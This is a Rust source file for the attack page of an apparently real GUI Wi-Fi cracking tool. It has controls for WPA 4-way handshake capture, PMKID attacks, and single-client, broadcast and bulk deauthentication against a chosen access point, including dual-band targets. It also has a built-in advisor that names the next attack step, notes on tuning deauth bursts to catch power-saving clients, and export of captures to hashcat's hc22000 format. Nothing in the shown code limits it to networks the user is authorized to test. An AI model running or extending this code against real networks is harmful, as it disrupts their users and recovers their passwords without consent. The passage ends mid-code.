//! Attacks page: target banner, capture/PMKID/deauth triggers (mock-injected
//! into the event channel), capture cards, hc22000 export.

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use gpui::{
    Context, Entity, IntoElement, ParentElement, Styled, Window, div, prelude::FluentBuilder, px,
};
use gpuikit::elements::badge::badge;
use gpuikit::elements::button::button;
use gpuikit::elements::card::card;
use gpuikit::elements::loading_indicator::loading_indicator;
use gpuikit::elements::text_field::text_field;
use gpuikit::elements::typography::{h3, small, text};
use gpuikit::layout::{h_stack, v_stack};
use gpuikit::theme::{ActiveTheme, Themeable};

use crate::common::{Akm, ClientInfo, Cmd, Event, HandshakeCapture, MacAddr, PmkidCapture};
use crate::ui::app::AppRoot;
use crate::ui::mock;

fn unix_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

/// Export all captures: platform save dialog if it opens, otherwise a fixed
/// fallback path under ./captures. Uses the crate's hc22000 formatting
/// (single source of truth in [`crate::handshake`]).
fn export_hc22000(view: &Entity<AppRoot>, _window: &mut Window, cx: &mut gpui::App) {
    let (lines, lossless_note) = {
        let app = view.read(cx);
        let mut lines: Vec<String> = app
            .state
            .handshakes
            .iter()
            .map(crate::handshake::handshake_hc22000)
            .chain(app.state.pmkids.iter().map(crate::handshake::pmkid_hc22000))
            .collect();
        lines.sort_unstable();
        lines.dedup();
        (lines, app.state.handshakes.len() + app.state.pmkids.len())
    };
    if lines.is_empty() {
        view.update(cx, |app, cx| {
            app.state.push_log("export: no captures yet");
            cx.notify();
        });
        return;
    }

    let suggested = format!("wifilab-{}.hc22000", unix_secs());
    let prompt = cx.prompt_for_new_path(Path::new("./captures"), Some(&suggested));
    let body = lines.join("\n") + "\n";
    let weak = view.downgrade();
    cx.spawn(async move |cx| {
        // Dialog refused/cancelled → fixed fallback; explicit cancel aborts.
        let path: Option<PathBuf> = match prompt.await {
            Ok(Ok(Some(p))) => Some(p),
            Ok(Ok(None)) => None,
            _ => Some(PathBuf::from("./captures").join(&suggested)),
        };
        let _ = weak.update(cx, |app, cx| {
            match path {
                None => app.state.push_log("export: cancelled"),
                Some(path) => {
                    if let Some(parent) = path.parent() {
                        let _ = std::fs::create_dir_all(parent);
                    }
                    match std::fs::write(&path, &body) {
                        Ok(()) => app
                            .state
                            .push_log(format!("export: {} captures → {}", lossless_note, path.display())),
                        Err(e) => app
                            .state
                            .push_log(format!("export FAILED: {e} ({})", path.display())),
                    }
                }
            }
            cx.notify();
        });
    })
    .detach();
}

/// Export the raw pcap spool (every frame the scanner saw since the
/// capture started) via the platform save dialog; falls back to a fixed
/// path under ./captures when the dialog is refused.
fn export_pcap(view: &Entity<AppRoot>, _window: &mut Window, cx: &mut gpui::App) {
    let spool = crate::store::data_dir().join("spool.pcap");
    if !spool.is_file() {
        view.update(cx, |app, cx| {
            app.state
                .push_log("pcap export: no spool yet — start a capture first");
            cx.notify();
        });
        return;
    }

    let suggested = format!("wifilab-{}.pcap", unix_secs());
    let prompt = cx.prompt_for_new_path(Path::new("./captures"), Some(&suggested));
    let weak = view.downgrade();
    cx.spawn(async move |cx| {
        // Dialog refused/cancelled → fixed fallback; explicit cancel aborts.
        let path: Option<PathBuf> = match prompt.await {
            Ok(Ok(Some(p))) => Some(p),
            Ok(Ok(None)) => None,
            _ => Some(PathBuf::from("./captures").join(&suggested)),
        };
        let _ = weak.update(cx, |app, cx| {
            match path {
                None => app.state.push_log("pcap export: cancelled"),
                Some(path) => {
                    if let Some(parent) = path.parent() {
                        let _ = std::fs::create_dir_all(parent);
                    }
                    match std::fs::copy(&spool, &path) {
                        Ok(n) => app
                            .state
                            .push_log(format!("pcap export: {n} bytes → {}", path.display())),
                        Err(e) => app
                            .state
                            .push_log(format!("pcap export FAILED: {e} ({})", path.display())),
                    }
                }
            }
            cx.notify();
        });
    })
    .detach();
}

/// Selected target with its current AP row (channel + essid).
fn target_info(app: &AppRoot) -> Option<(MacAddr, u8, String)> {
    let ap = app.selected?;
    let row = app.state.aps.get(&ap)?;
    Some((ap, row.channel, row.ssid.clone()))
}

/// The selected target's AP row for rendering: the live record wins;
/// otherwise the snapshot taken at click time (host-capture mode never
/// re-scans, so a valid target may have no live row at all). Second tuple
/// element is true when falling back to the (possibly stale) snapshot.
fn target_row(app: &AppRoot) -> Option<(&crate::common::AccessPoint, bool)> {
    let sel = app.selected?;
    if let Some(row) = app.state.aps.get(&sel) {
        return Some((row, false));
    }
    app.selected_ap.as_ref().map(|row| (row, true))
}

/// Material already captured for this AP (dual-band siblings count as
/// their own BSSIDs — a handshake grabbed on the 5 GHz twin crackable
/// for the same password, so count the whole ESSID family).
fn material_for(app: &AppRoot, ap: &crate::common::AccessPoint) -> (usize, usize) {
    let essids = sibling_targets(app, &ap.ssid)
        .into_iter()
        .map(|(b, _)| b)
        .collect::<Vec<_>>();
    let hs = app
        .state
        .handshakes
        .iter()
        .filter(|h| essids.contains(&h.ap))
        .count();
    let pm = app
        .state
        .pmkids
        .iter()
        .filter(|p| essids.contains(&p.ap))
        .count();
    (hs, pm)
}

/// One-line "best next move" for the selected target, computed from what
/// the scanner already knows — the answer to "which button do I press".
/// Second tuple element: true = actionable path, false = dead end (the
/// card colors accordingly).
fn advisor(app: &AppRoot, ap: &crate::common::AccessPoint) -> (&'static str, bool) {
    use crate::common::Security;
    let akms = &ap.akms;
    let sae = !akms.is_empty()
        && akms.contains(&Akm::Sae)
        && !akms.contains(&Akm::Psk)
        && !akms.contains(&Akm::PskSha256);
    if sae {
        return (
            "advice: SAE-only — no offline-crackable material exists (dead end for today)",
            false,
        );
    }
    match ap.security {
        Security::Open => return ("advice: open network — nothing to crack", false),
        Security::Wep => {
            return (
                "advice: WEP — ancient; out of scope here (use dedicated tools)",
                false,
            );
        }
        _ => {}
    }
    if !akms.is_empty() && akms.contains(&Akm::Owe) && !akms.contains(&Akm::Psk) {
        return ("advice: OWE (enhanced open) — no password to recover", false);
    }
    let (hs, pm) = material_for(app, ap);
    if hs + pm > 0 {
        return (
            "advice: capture material in hand — crack it on the Cracker page",
            true,
        );
    }
    if sae_transition(akms) {
        return (
            "advice: WPA3 transition (PSK still offered) — handshake capture or PMKID works",
            true,
        );
    }
    if connected_clients(app, ap.bssid).is_empty() {
        (
            "advice: no clients mapped — run PMKID first (clientless), then park a handshake capture",
            true,
        )
    } else {
        (
            "advice: deauth a client while handshake capture runs — it re-auths with a fresh 4-way",
            true,
        )
    }
}

fn sae_transition(akms: &[Akm]) -> bool {
    akms.contains(&Akm::Sae) && (akms.contains(&Akm::Psk) || akms.contains(&Akm::PskSha256))
}

/// WPA3 SAE-only targets yield no offline-crackable material: the
/// dragonfly handshake can't be brute-forced offline and SAE APs never
/// hand out a PMKID. Transition-mode APs (PSK alongside SAE) still work.
fn sae_only(app: &AppRoot) -> bool {
    let Some((row, _stale)) = target_row(app) else {
        return false;
    };
    let akms = &row.akms;
    !akms.is_empty()
        && akms.contains(&Akm::Sae)
        && !akms.contains(&Akm::Psk)
        && !akms.contains(&Akm::PskSha256)
}

/// Capture Handshake.
/// Mock mode: drive a fresh fabricated 4-way through the event pipeline.
/// Real mode: spawn the backend capture worker (channel probed first via
/// a zero-count deauth pulse); progress/completion arrive as real events.
fn capture_handshake(view: &Entity<AppRoot>, _window: &mut Window, cx: &mut gpui::App) {
    view.update(cx, |app, cx| {
        let Some(ap) = app.selected else {
            app.state.push_log("handshake: no target selected");
            cx.notify();
            return;
        };
        if app.attacking_handshake {
            return;
        }
        if !app.is_mock && !app.state.iface_running {
            app.state
                .push_log("handshake: start capture first (attacks need the radio in monitor mode)");
            cx.notify();
            return;
        }
        app.attacking_handshake = true;
        cx.notify();

        if !app.is_mock {
            let Some((_sel_bssid, _sel_ch, essid)) = target_info(app) else {
                app.state
                    .push_log("handshake: target AP not in scan table yet");
                app.attacking_handshake = false;
                cx.notify();
                return;
            };
            // Dual-band: watch EVERY BSSID of this ESSID (the scanner
            // parks on the union of channels, so all bands are covered).
            let targets = sibling_targets(app, &essid);
            let channels = channels_of(&targets);
            app.state.push_log(format!(
                "handshake capture on {essid} — {} bssid(s), ch [{}]… deauth a client to force re-auth",
                targets.len(),
                channels.iter().map(u8::to_string).collect::<Vec<_>>().join(", ")
            ));
            park_channels(app, &channels);
            if let Some(svc) = &app.service {
                svc.cmd(&Cmd::CaptureHs { targets, essid });
            }
            cx.notify();
            return;
        }

        // ---- mock path ----
        let essid = app
            .state
            .aps
            .get(&ap)
            .map(|a| a.ssid.clone())
            .unwrap_or_else(|| ap.to_string());
        // Prefer a client actually associated with the target.
        let client = app
            .state
            .clients
            .values()
            .find(|c| c.ap == Some(ap))
            .map(|c| c.mac)
            .unwrap_or(mock::MOCK_CLIENTS[0]);
        app.state
            .push_log(format!("handshake capture on {essid} ({ap}), targeting {client}…"));
        cx.notify();

        let tx = app.tx.clone();
        let essid_ev = essid.clone();
        let salt = unix_secs();
        cx.spawn(async move |this, cx| {
            let _ = tx.send(Event::HandshakeProgress {
                ap,
                client,
                have: 0b0001,
            });
            cx.background_executor()
                .timer(Duration::from_millis(900))
                .await;
            let _ = tx.send(Event::HandshakeProgress {
                ap,
                client,
                have: 0b0011,
            });
            cx.background_executor()
                .timer(Duration::from_millis(900))
                .await;
            let cap = mock::fabricate_handshake(ap, client, &essid_ev, salt);
            let _ = tx.send(Event::HandshakeComplete(Box::new(cap)));
            let _ = this.update(cx, |app, cx| {
                app.attacking_handshake = false;
                cx.notify();
            });
        })
        .detach();
    });
}

/// PMKID attack: client-less, one exchange, captured PMKID arrives shortly.
fn pmkid_attack(view: &Entity<AppRoot>, _window: &mut Window, cx: &mut gpui::App) {
    view.update(cx, |app, cx| {
        let Some(ap) = app.selected else {
            app.state.push_log("pmkid: no target selected");
            cx.notify();
            return;
        };
        if app.attacking_pmkid {
            return;
        }
        if !app.is_mock && !app.state.iface_running {
            app.state
                .push_log("pmkid: start capture first (attacks need the radio in monitor mode)");
            cx.notify();
            return;
        }
        app.attacking_pmkid = true;
        cx.notify();

        if !app.is_mock {
            let Some((ap, channel, essid)) = target_info(app) else {
                app.state
                    .push_log("pmkid: target AP not in scan table yet");
                app.attacking_pmkid = false;
                cx.notify();
                return;
            };
            app.state
                .push_log(format!("pmkid attack on {essid} ({ap}, ch {channel})…"));
            park_channels(app, &[channel]);
            if let Some(svc) = &app.service {
                svc.cmd(&Cmd::Pmkid { ap, channel, essid });
            }
            cx.notify();
            return;
        }

        // ---- mock path ----
        let essid = app
            .state
            .aps
            .get(&ap)
            .map(|a| a.ssid.clone())
            .unwrap_or_else(|| ap.to_string());
        app.state
            .push_log(format!("pmkid attack on {essid} ({ap})…"));
        cx.notify();

        let tx = app.tx.clone();
        let salt = unix_secs() ^ 0x77;
        cx.spawn(async move |this, cx| {
            cx.background_executor()
                .timer(Duration::from_millis(1200))
                .await;
            let cap = mock::fabricate_pmkid(ap, mock::MOCK_CLIENTS[3], &essid, salt);
            let _ = tx.send(Event::PmkidCaptured(cap));
            let _ = this.update(cx, |app, cx| {
                app.attacking_pmkid = false;
                cx.notify();
            });
        })
        .detach();
    });
}

/// Every BSSID sharing the target's ESSID, with the selected target
/// first — dual-band routers broadcast one SSID on several bands and the
/// client picks one; attacks must cover all of them. Falls back to just
/// the selected target when nothing else is known.
fn sibling_targets(app: &AppRoot, essid: &str) -> Vec<(MacAddr, u8)> {
    let mut targets: Vec<(MacAddr, u8)> = Vec::new();
    let mut others: Vec<(MacAddr, u8)> = Vec::new();
    for a in app.state.aps.values() {
        if a.ssid == essid && a.channel != 0 {
            if Some(a.bssid) == app.selected {
                targets.push((a.bssid, a.channel));
            } else {
                others.push((a.bssid, a.channel));
            }
        }
    }
    targets.extend(others);
    targets
}

/// Union of channels of a target list (sorted, deduped, zeros dropped).
fn channels_of(targets: &[(MacAddr, u8)]) -> Vec<u8> {
    let mut ch: Vec<u8> = targets.iter().map(|(_, c)| *c).collect();
    ch.sort_unstable();
    ch.dedup();
    ch
}

/// Restrict the scanner to the target channels so attack workers aren't
/// fighting the 100 ms spectrum-wide hopper (capture/PMKID listen, deauth
/// injects — a far-away radio is mostly deaf/blind). Restarts the scanner
/// with the restricted plan when not already parked on it; a no-op
/// otherwise and in mock mode.
fn park_channels(app: &mut AppRoot, channels: &[u8]) {
    let mut want = channels.to_vec();
    want.sort_unstable();
    want.dedup();
    if app.is_mock || want.is_empty() || app.parked_channels.as_deref() == Some(&want) {
        return;
    }
    // A channel-plan restart also stops any running attack worker — the
    // new plan invalidates them; the caller (re)spawns its own worker
    // right after.
    if let Some(svc) = &app.service {
        svc.cmd(&Cmd::StartScan {
            ifname: app.state.ifname.clone(),
            channels: Some(want.clone()),
            // Keep appending to the same spool across attack-mode restarts
            // — only the toggle-monitor start truncates.
            spool: Some(crate::store::data_dir().join("spool.pcap")),
            fresh_spool: false,
        });
        app.parked_channels = Some(want.clone());
        app.state
            .push_log(format!("scanner parked on ch [{}] (attack mode)", want.iter().map(u8::to_string).collect::<Vec<_>>().join(", ")));
    }
}

/// Deauth `target` (a station, or [`MacAddr::BROADCAST`] for the whole
/// net) against the selected AP, `count` rounds from the count field.
/// Real mode blasts from the service's own socket; mock mode fabricates
/// the same DeauthSent event the real worker emits.
fn do_deauth(app: &mut AppRoot, cx: &mut Context<AppRoot>, target: MacAddr) {
    let Some(ap) = app.selected else {
        app.state.push_log("deauth: no target selected");
        cx.notify();
        return;
    };
    let count64: u64 = app
        .deauth_input
        .read(cx)
        .content()
        .trim()
        .parse()
        // 64 rounds ≈ 2 s of airtime per direction — short bursts
        // (16 × 15 ms ≈ 0.25 s) slip entirely under a power-save client's
        // doze window and land nothing (verified on lab mt7922).
        .unwrap_or(64);

    if !app.is_mock {
        if !app.state.iface_running {
            app.state
                .push_log("deauth: start capture first (injection needs monitor mode)");
            cx.notify();
            return;
        }
        if app.service.is_none() {
            app.state
                .push_log("deauth: start capture first (the service owns the radio)");
            cx.notify();
            return;
        }
        let Some((_sel_bssid, _sel_ch, essid)) = target_info(app) else {
            app.state
                .push_log("deauth: target AP not in scan table yet");
            cx.notify();
            return;
        };
        // Dual-band: blast every BSSID of this ESSID — the client picks
        // the band, we don't get to. The service worker walks the list
        // sequentially.
        let aps = sibling_targets(app, &essid);
        let channels = channels_of(&aps);
        // Park ONCE on the final plan before sending ANY attack command:
        // a channel-plan restart stop-joins all workers, so parking later
        // would kill the capture worker armed just below.
        park_channels(app, &channels);
        // A deauth without a listener yields nothing: arm a handshake
        // capture first when none is running (the flag is app-global —
        // one target at a time, matching the attacks page). CaptureHs is
        // handled before Deauth (single command pipe), and the service
        // holds the channel synchronously there, so the blast can't shake
        // a client loose onto an unwatched band.
        if !app.attacking_handshake {
            app.attacking_handshake = true;
            app.state.push_log(format!(
                "deauth: no capture running — auto-armed handshake capture on {essid}"
            ));
            app.service
                .as_ref()
                .expect("service presence checked above")
                .cmd(&Cmd::CaptureHs {
                    targets: aps.clone(),
                    essid: essid.clone(),
                });
        }
        let count = count64.min(u32::MAX as u64) as u32;
        let kind = if target.is_broadcast() {
            "broadcast".to_string()
        } else {
            format!("client {target}")
        };
        app.state.push_log(format!(
            "deauth: {count} rounds → {kind} ({} bssid(s), ch [{}])",
            aps.len(),
            channels.iter().map(u8::to_string).collect::<Vec<_>>().join(", ")
        ));
        app.service
            .as_ref()
            .expect("service presence checked above")
            .cmd(&Cmd::Deauth { aps: aps.clone(), target, count });
        // Optimistic DOWN marking: monitor-mode TX never loops back to
        // the scanner socket (verified: PACKET_OUTGOING never surfaces on
        // mt7921e injection), so the scanner can't observe our own blast
        // and the row would stay "up" until the client talks again
        // (ClientUpdated flips it back) or ages out. Broadcast → every
        // station mapped to a sibling BSSID of this ESSID.
        for cl in app.state.clients.values_mut() {
            let blasted = if target.is_broadcast() {
                cl.ap.is_some_and(|cap| aps.iter().any(|(b, _)| *b == cap))
            } else {
                cl.mac == target
            };
            if blasted {
                cl.connected = false;
            }
        }
        cx.notify();
        return;
    }

    let _ = app.tx.send(Event::DeauthSent {
        ap,
        target,
        count: count64,
    });
    // Same optimistic DOWN marking as the real branch (see there).
    for cl in app.state.clients.values_mut() {
        let blasted = if target.is_broadcast() {
            cl.ap.is_none_or(|cap| cap == ap)
        } else {
            cl.mac == target
        };
        if blasted {
            cl.connected = false;
        }
    }
    cx.notify();
}

/// A client row counts as belonging to the selected target when the
/// scanner mapped it there — OR when its AP is unknown (the scanner often
/// never resolves the association; trust the user's pick).
fn client_on_target(app: &AppRoot, mac: &MacAddr, ap: MacAddr) -> bool {
    app.state
        .clients
        .get(mac)
        .is_some_and(|c| c.ap.is_none_or(|cap| cap == ap))
}

/// Deauth button: a selected client row (see [`client_on_target`]) wins;
/// otherwise deauth the whole net broadcast-style.
fn deauth(view: &Entity<AppRoot>, _window: &mut Window, cx: &mut gpui::App) {
    view.update(cx, |app, cx| {
        let target = app
            .selected
            .and_then(|ap| {
                app.selected_client
                    .filter(|mac| client_on_target(app, mac, ap))
            })
            .unwrap_or(MacAddr::BROADCAST);
        do_deauth(app, cx, target);
    });
}

/// Per-station Deauth button in the stations table: fires immediately at
/// that station, no handshake capture required.
fn deauth_station(view: &Entity<AppRoot>, station: MacAddr, cx: &mut gpui::App) {
    view.update(cx, |app, cx| do_deauth(app, cx, station));
}

/// Connected clients mapped to the selected AP (strict association —
/// `client_on_target`'s "unknown AP" leniency would sweep strangers into
/// a bulk blast).
fn connected_clients(app: &AppRoot, ap: MacAddr) -> Vec<MacAddr> {
    let mut macs: Vec<MacAddr> = app
        .state
        .clients
        .values()
        .filter(|c| c.ap == Some(ap) && c.connected && !c.mac.is_broadcast())
        .map(|c| c.mac)
        .collect();
    macs.sort();
    macs
}

/// Bulk deauth: every connected client of the selected AP in one service
/// job (single channel pin, per-client rounds, then one broadcast blast).
/// Mock mode fabricates the same DeauthSent stream per client.
fn deauth_all(view: &Entity<AppRoot>, cx: &mut gpui::App) {
    view.update(cx, |app, cx| {
        let Some(ap) = app.selected else {
            app.state.push_log("deauth-all: no target selected");
            cx.notify();
            return;
        };
        let targets = connected_clients(app, ap);
        if targets.len() < 2 {
            app.state
                .push_log("deauth-all: fewer than 2 connected clients — deauth them one by one");
            cx.notify();
            return;
        }
        let count64: u64 = app
            .deauth_input
            .read(cx)
            .content()
            .trim()
            .parse()
            .unwrap_or(64);

        if !app.is_mock {
            if !app.state.iface_running || app.service.is_none() {
                app.state
                    .push_log("deauth-all: start capture first (injection needs monitor mode)");
                cx.notify();
                return;
            }
            let Some((_sel_bssid, channel, essid)) = target_info(app) else {
                app.state
                    .push_log("deauth-all: target AP not in scan table yet");
                cx.notify();
                return;
            };
            // Park before ANY attack command (see do_deauth) and arm a
            // capture so the forced re-auths land in a listener.
            park_channels(app, &[channel]);
            if !app.attacking_handshake {
                app.attacking_handshake = true;
                app.state.push_log(format!(
                    "deauth-all: no capture running — auto-armed handshake capture on {essid}"
                ));
                let aps = sibling_targets(app, &essid);
                app.service
                    .as_ref()
                    .expect("service presence checked above")
                    .cmd(&Cmd::CaptureHs {
                        targets: aps,
                        essid,
                    });
            }
            let count = count64.min(u32::MAX as u64) as u32;
            app.state.push_log(format!(
                "deauth-all: {count} rounds → {} clients of {ap} (ch {channel})",
                targets.len()
            ));
            app.service
                .as_ref()
                .expect("service presence checked above")
                .cmd(&Cmd::DeauthAll {
                    ap,
                    channel,
                    targets: targets.clone(),
                    count,
                });
            // Optimistic DOWN marking (see do_deauth).
            for cl in app.state.clients.values_mut() {
                if targets.contains(&cl.mac) {
                    cl.connected = false;
                }
            }
            cx.notify();
            return;
        }

        // ---- mock path ----
        for target in &targets {
            let _ = app.tx.send(Event::DeauthSent {
                ap,
                target: *target,
                count: count64,
            });
        }
        for cl in app.state.clients.values_mut() {
            if targets.contains(&cl.mac) {
                cl.connected = false;
            }
        }
        cx.notify();
    });
}

fn kv(label: &str, value: impl Into<String>) -> gpui::Div {
    h_stack()
        .gap_2()
        .child(div().w(px(90.)).text_xs().child(label.to_string()))
        .child(text(value.into()).code().small().into_any_element())
}

fn handshake_card(hs: &HandshakeCapture, crackable: bool) -> gpuikit::elements::card::Card {
    card()
        .title(format!("{} — handshake", hs.essid))
        .description(format!("{} ⇄ {}", hs.ap, hs.client))
        .body(
            v_stack()
                .gap_1()
                .child(kv("key version", format!("{}", hs.key_ver)))
                .child(kv("anonce", hex(&hs.anonce[..8])))
                .child(
                    h_stack().gap_2().child(if crackable {
                        badge("crackable").secondary()
                    } else {
                        badge("partial")
                    }),
                )
                .into_any_element(),
        )
}

fn pmkid_card(pm: &PmkidCapture) -> gpuikit::elements::card::Card {
    card()
        .title(format!("{} — PMKID", pm.essid))
        .description(format!("AP {}", pm.ap))
        .body(
            v_stack()
                .gap_1()
                .child(kv("pmkid", hex(&pm.pmkid)))
                .child(kv("via (our mac)", pm.client.to_string()))
                .child(h_stack().gap_2().child(badge("crackable").secondary()))
                .into_any_element(),
        )
}

pub fn render(
    app: &mut AppRoot,
    view: &Entity<AppRoot>,
    _window: &mut Window,
    cx: &mut Context<AppRoot>,
) -> gpui::Div {
    let theme = cx.theme().clone();

    // Client chip for the banner: the selected client counts when it's
    // mapped to the target AP or its association is unknown (scanner often
    // never resolves it).
    let banner_client: Option<MacAddr> = app.selected.and_then(|ap| {
        app.selected_client
            .filter(|mac| client_on_target(app, mac, ap))
    });

    // Target context card: everything Networks knows about the target,
    // one glance, plus a computed "best next move". Falls back to the
    // click-time snapshot when the AP has no live row (host-capture
    // lock never re-scans) so the card can't silently go blank.
    let target_block: gpui::AnyElement = match target_row(app) {
        Some((ap, stale)) => {
            let bssid = ap.bssid;
            let (hs_n, pm_n) = material_for(app, ap);
            let siblings = sibling_targets(app, &ap.ssid).len();
            let akm_join = ap
                .akms
                .iter()
                .map(|a| a.label())
                .collect::<Vec<_>>()
                .join("+");
            let spark = app.state.rssi_hist.get(&bssid).cloned();
            let label = app.state.labels.get(&bssid).cloned();
            let (advice, actionable) = advisor(app, ap);
            let client_line = banner_client.map(|c| {
                let lbl = app
                    .state
                    .labels
                    .get(&c)
                    .map(|l| format!(" “{l}”"))
                    .unwrap_or_default();
                text(format!("client: {c}{lbl}")).code().small().into_any_element()
            });
            v_stack()
                .gap_2()
                .p_3()
                .rounded_md()
                .border_1()
                .border_color(theme.border())
                .bg(theme.surface())
                .child(h3(format!(
                    "target: {}{}",
                    ap.ssid,
                    label.map(|l| format!(" “{l}”")).unwrap_or_default()
                )))
                .child(small(format!(
                    "{bssid} · ch {} ({} GHz) · vendor {}{}",
                    ap.channel,
                    crate::ui::networks::band(ap.channel),
                    crate::ui::networks::vendor_of(&bssid),
                    if stale { " · last scan snapshot" } else { "" }
                )))
                .child(
                    v_stack()
                        .gap_2()
                        .child(
                            h_stack()
                                .gap_2()
                                .items_center()
                                .child(crate::ui::networks::sec_badge_label(
                                    &crate::ui::networks::sec_label(ap),
                                    ap.security,
                                ))
                                .children((!akm_join.is_empty()).then(|| small(akm_join)))
                                .children((siblings > 1)
                                    .then(|| badge(format!("dual-band x{siblings}")).secondary())),
                        )
                        .child(
                            h_stack()
                                .gap_3()
                                .items_center()
                                .child(crate::ui::networks::sparkline(
                                    spark.as_ref(),
                                    theme.accent(),
                                ))
                                .child(small(format!(
                                    "{} dBm · {} beacons · seen {} ago",
                                    ap.rssi_dbm,
                                    ap.beacons,
                                    crate::ui::networks::age(ap.last_seen_ms)
                                ))),
                        )
                        .child(small(format!(
                            "material for this AP family: {hs_n} handshake(s) · {pm_n} PMKID(s)"
                        )))
                        .children(client_line)
                        .child(
                            div()
                                .text_xs()
                                .text_color(if actionable {
                                    theme.accent()
                                } else {
                                    theme.warning()
                                })
                                .child(advice),
                        ),
                )
                .into_any_element()
        }
        None => h_stack()
            .gap_3()
            .items_center()
            .child(h3("target: none selected"))
            .child(small("pick an AP on the Networks page"))
            .into_any_element(),
    };

    let no_target = app.selected.is_none();
    // Real mode without a running capture has no radio: block the buttons
    // (a matching hint sits next to them).
    let not_running = !app.is_mock && !app.state.iface_running;
    let blocked = no_target || not_running;
    // SAE-only: no offline attack applies (see sae_only).
    let sae = sae_only(app);
    let hs_running = app.attacking_handshake;
    let pm_running = app.attacking_pmkid;

    // Bulk-deauth candidates: strictly-mapped connected clients of the
    // selected AP. Click-time count for the button label.
    let deauth_targets: usize = app
        .selected
        .map(|ap| connected_clients(app, ap).len())
        .unwrap_or(0);
    app.deauth_all_targets = deauth_targets;

    let actions = h_stack()
        .gap_3()
        .items_center()
        .child(
            button("btn-handshake", "Capture Handshake")
                .disabled(blocked || hs_running || sae)
                .on_click({
                    let view = view.clone();
                    move |_, window, cx| capture_handshake(&view, window, cx)
                }),
        )
        .child(
            button("btn-pmkid", "PMKID Attack")
                .disabled(blocked || pm_running || sae)
                .on_click({
                    let view = view.clone();
                    move |_, window, cx| pmkid_attack(&view, window, cx)
                }),
        )
        .child(
            button(
                "btn-deauth",
                if banner_client.is_some() {
                    "Deauth client"
                } else {
                    "Deauth all"
                },
            )
            .destructive()
            .disabled(blocked || sae)
            .on_click({
                let view = view.clone();
                move |_, window, cx| deauth(&view, window, cx)
            }),
        )
        .children((deauth_targets >= 2).then(|| {
            button(
                "btn-deauth-all",
                format!("Deauth all clients ({deauth_targets})"),
            )
            .destructive()
            .disabled(blocked || sae)
            .on_click({
                let view = view.clone();
                move |_, _window, cx| deauth_all(&view, cx)
            })
        }))
        .child(
            div()
                .w(px(90.))
                .child(text_field(&app.deauth_input, cx).placeholder("count")),
        )
        .when(hs_running || pm_running, |el| {
            el.child(loading_indicator().small()).child(small("working…"))
        })
        .when(not_running, |el| {
            el.child(small("start capture first to enable attacks"))
        });

    // In-flight 4-way attempts shown with their message bitmask.
    let progress_cards: Vec<gpui::AnyElement> = app
        .hs_progress
        .iter()
        .map(|((ap, client), have)| {
            card()
                .title(format!("collecting 4-way… {}/4", have.count_ones()))
                .description(format!("{ap} ⇄ {client}"))
                .body(
                    h_stack()
                        .gap_2()
                        .child(loading_indicator().small())
                        .into_any_element(),
                )
                .into_any_element()
        })
        .collect();

    // Stations of the target: deauth a client directly (forces its
    // re-auth → its 4-way handshake) without touching anything else.
    let stations: Vec<&ClientInfo> = app
        .selected
        .map(|sel| {
            app.state
                .clients
                .values()
                .filter(|c| client_on_target(app, &c.mac, sel) && !c.mac.is_broadcast())
                .collect()
        })
        .unwrap_or_default();

    let stations_block = app.selected.map(|_sel| {
        let rows: Vec<gpui::AnyElement> = stations
            .iter()
            .map(|cl| {
                let mac = cl.mac;
                let ap_of = cl.ap;
                let view = view.clone();
                // MAC-randomization pairing chip: live row's own fields,
                // overlaid by the pairing record (wire fields can lag).
                let ident = app
                    .state
                    .idents
                    .get(&mac)
                    .copied()
                    .or(cl.ident_group.zip(cl.ident_conf));
                h_stack()
                    .w_full()
                    .gap_3()
                    .items_center()
                    .px_2()
                    .py_1()
                    .child(
                        v_stack()
                            .w(px(170.))
                            .child(text(mac.to_string()).code().small().into_any_element())
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(theme.fg_muted())
                                    .child(crate::ui::networks::vendor_of(&mac)),
                            ),
                    )
                    .children(
                        app.state
                            .labels
                            .get(&mac)
                            .map(|l| small(format!("“{l}”"))),
                    )
                    .children(ident.and_then(|(gid, conf)| {
                        let n = app
                            .state
                            .ident_groups
                            .get(&gid)
                            .map_or(1, |ms| ms.len());
                        let mut el = div()
                            .w(px(90.))
                            .text_xs()
                            .child(format!("#{gid}{} ({n})", conf.label()));
                        if n > 1 {
                            el = el.text_color(theme.accent());
                        } else {
                            el = el.text_color(theme.fg_muted());
                        }
                        Some(el)
                    }))
                    .child(
                        div()
                            .w(px(70.))
                            .text_xs()
                            .child(format!("{} dBm", cl.rssi_dbm)),
                    )
                    .child(div().w(px(60.)).text_xs().child(format!(
                        "{} fr",
                        cl.frames
                    )))
                    .child(
                        div()
                            .w(px(50.))
                            .text_xs()
                            .child(crate::ui::networks::age(cl.last_seen_ms)),
                    )
                    .children((ap_of.is_none())
                        .then(|| small("AP unmapped — treating as target's station")))
                    .child(div().flex_1())
                    .child(
                        button(
                            gpui::SharedString::from(format!("deauth-sta-{mac}")),
                            "Deauth client",
                        )
                        .destructive()
                        .disabled(!app.is_mock && !app.state.iface_running)
                        .on_click(move |_, _window, cx| deauth_station(&view, mac, cx)),
                    )
                    .into_any_element()
            })
            .collect();

        let body = if rows.is_empty() {
            div().child(small(
                "no stations seen on this AP yet — click any client row on the Networks page \
                 to target it here anyway",
            ))
            .into_any_element()
        } else {
            v_stack().gap_1().children(rows).into_any_element()
        };

        v_stack()
            .gap_2()
            .child(
                h_stack()
                    .items_center()
                    .gap_3()
                    .child(h3("Stations"))
                    .child(small(format!(
                        "{} — deauth one to force its handshake while capture runs",
                        stations.len()
                    ))),
            )
            .child(body)
            .into_any_element()
    });

    // Recent attack-relevant activity, so every button press leaves a
    // visible trace on THIS page (the full history lives on the Log page).
    const ACTIVITY_LINES: usize = 8;
    let activity: Vec<String> = app
        .state
        .log
        .iter()
        .filter(|line| {
            [
                "deauth", "handshake", "pmkid", "4-way", "scanner parked", "ERROR", "PASSWORD",
                "target selected", "client selected",
            ]
            .iter()
            .any(|p| line.starts_with(p))
        })
        .rev()
        .take(ACTIVITY_LINES)
        .cloned()
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect();

    let mut page = v_stack()
        .size_full()
        .gap_3()
        .p_4()
        .child(target_block)
        .when(sae, |el| {
            el.child(
                div()
                    .text_xs()
                    .text_color(theme.warning())
